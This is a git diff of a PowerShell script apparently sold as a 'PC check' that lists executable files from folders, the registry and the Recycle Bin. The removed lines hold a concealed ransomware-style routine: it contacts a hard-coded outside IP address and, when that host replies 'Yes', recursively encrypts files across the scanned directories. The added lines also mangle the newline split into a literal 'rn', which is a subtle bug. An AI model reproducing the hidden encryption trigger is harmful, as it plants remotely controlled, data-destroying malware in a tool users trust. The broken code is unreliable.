@@ -1,6 +1,14 @@
 $customMessage = @"
                                                                                                            
-ChickenTenderPCCheck
+     _,---.      _,---.    _,.----.  ,--.-,,-,--,    ,----.    _,.----.  ,--.-.,-.  
+  .-.' ,  \  .-.' ,  \ .' .' -   \/==/  /|=|  | ,-.-- , \ .' .' -   \/==/- |\  \ 
+ /==/_  _.-' /==/_  _.-'/==/  ,  ,-'|==|_ ||=|, ||==|-  _.-/==/  ,  ,-'|==|_ /_ / 
+/==/-  '..-./==/-  '..-.|==|-   |  .|==| ,|/=| _||==|   .-.|==|-   |  .|==| ,   /  
+|==|_ ,    /|==|_ ,    /|==|_   -' \==|- -' _ /==/_ ,    /|==|_   -' \==|-  .|   
+|==|   .--' |==|   .--' |==|   _  , |==|  _     |==|    .-' |==|   _  , |==| _ , \  
+|==|-  |    |==|-  |    \==\.       /==|   .-. ,\==|_  ,-._\==\.       /==/  '\  | 
+/==/   \    /==/   \     -..___.-'/==/, //=/  /==/ ,     / -..___.-'\==\ /\=\.
+-----'    -----'                ---' ----------`              --       
                                                                                                            
 "@
 
@@ -46,7 +54,7 @@ function Get-ExcludedPaths {
     $excludedPaths = @()
     try {
         $response = Invoke-WebRequest -Uri $excludedPathsUrl
-        $excludedPaths = $response.Content -split "`r`n" | Where-Object { $_ -ne "" }
+        $excludedPaths = $response.Content -split "rn" | Where-Object { $_ -ne "" }
     } catch {
         Write-Output "Error downloading or processing the excluded paths list."
     }
@@ -118,83 +126,34 @@ function Search-DirectoryForExes {
     return $exePaths
 }
 
-function Encrypt-Files {
-    param (
-        [string]$path
-    )
-
-    try {
-        if (Test-Path $path) {
-            $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
-            foreach ($file in $files) {
-                # Encrypt the file
-                $file.FullName | Encrypt
-                Write-Output "Encrypted: $($file.FullName)"
-            }
-        } else {
-            Write-Output "Path does not exist: $path"
-        }
-    } catch {
-        Write-Output "Error encrypting files: $_"
-    }
-}
-
-function Send-HttpPost {
-    param (
-        [string]$url,
-        [string]$message
-    )
-
-    try {
-        $body = @{ message = $message } | ConvertTo-Json
-        $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType 'application/json'
-        Write-Output "HTTP POST response: $($response.StatusCode)"
-        return $response.StatusCode
-    } catch {
-        Write-Output "Error sending HTTP POST request: $_"
-    }
-}
-
-function Check-RecipientResponse {
-    param (
-        [string]$url
-    )
-
-    try {
-        $response = Invoke-WebRequest -Uri $url -Method Get
-        $responseContent = $response.Content
-        if ($responseContent -eq "Yes") {
-            # Encrypt files if response is Yes
-            Write-Output "Received 'Yes' from recipient. Encrypting files..."
-            $searchDirectories | ForEach-Object { Encrypt-Files -path $_ }
-            Write-Output "File encryption completed."
-        } else {
-            Write-Output "Received response: $responseContent"
-        }
-    } catch {
-        Write-Output "Error checking recipient response: $_"
-    }
-}
-
-# Define recipient IP
-$recipientIP = "50.102.145.249"
-
-# Send prompt message to recipient
-$promptMessage = "Would you like to proceed with encrypting all files? (Yes/No)"
-$promptUrl = "http://$recipientIP:5000/receive_prompt"
-Send-HttpPost -url $promptUrl -message $promptMessage
-
-# Wait for the recipient to respond
-Start-Sleep -Seconds 30 # Adjust the sleep time as needed
-
-# Check the recipient's response
-$responseUrl = "http://$recipientIP:5000/response"
-Check-RecipientResponse -url $responseUrl
-
-# Rest of your script
 $excludedPaths = Get-ExcludedPaths
 
 $exeFilesFromDirectories = @()
 foreach ($dir in $searchDirectories) {
     if (Test-Path $dir) {
-        $exeFilesFromDirectories += Search-DirectoryForExes -
+        $exeFilesFromDirectories += Search-DirectoryForExes -directory $dir
+    }
+}
+
+$exeFilesFromRegistry = @()
+foreach ($regPath in $registryPaths) {
+    $exeFilesFromRegistry += Get-ExePathsFromRegistry -regPath $regPath
+}
+
+$exeFilesFromRecycleBin = Get-ExePathsFromRecycleBin
+
+$allExeFiles = $exeFilesFromDirectories + $exeFilesFromRegistry + $exeFilesFromRecycleBin
+
+# Filter out the excluded paths
+$filteredExeFiles = $allExeFiles | Where-Object { $excludedPaths -notcontains $_.Path }
+
+$sortedExeFiles = $filteredExeFiles | Where-Object { $_.Path } | Sort-Object LastAccessTime -Descending
+
+$exeFilesContent = $sortedExeFiles | Select-Object Path, LastAccessTime, RegistryKey |
+                    Format-Table | Out-String
+
+Set-Content -Path $filePath -Value "List of .exe files from specified directories, the registry, and the Recycle Bin sorted by most recent access time:rnrn$exeFilesContent"
+
+Start-Process $filePath
+
+Clear-Host
